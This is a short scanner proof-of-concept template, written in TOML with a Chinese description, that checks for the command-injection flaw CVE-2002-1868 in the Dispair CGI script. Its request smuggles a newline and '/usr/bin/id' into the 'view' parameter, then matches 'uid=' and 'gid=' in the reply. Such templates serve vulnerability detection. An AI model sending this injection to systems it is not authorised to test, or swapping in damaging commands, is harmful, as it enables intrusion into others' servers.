[info]
author = "ave"
description = "验证 Dispair 0.1/0.2 版本远程命令执行漏洞（CVE-2002-1868）。通过向 CGI 脚本的 view 参数注入换行符及任意系统命令，检测目标是否存在命令注入。"
id = "POC-AVE-2002-0712"
name = "Dispair 远程命令执行漏洞 PoC"
severity = "critical"
tags = ["ave-2002-0712"]
vuln_id = [
    "CVE-2002-1868",
    "AVE-2002-0712",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/dispair.cgi"
protocol = "http"
queries = [
    "file=fiddle",
    "view=%0A/usr/bin/id",
]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
    "groups=",
]
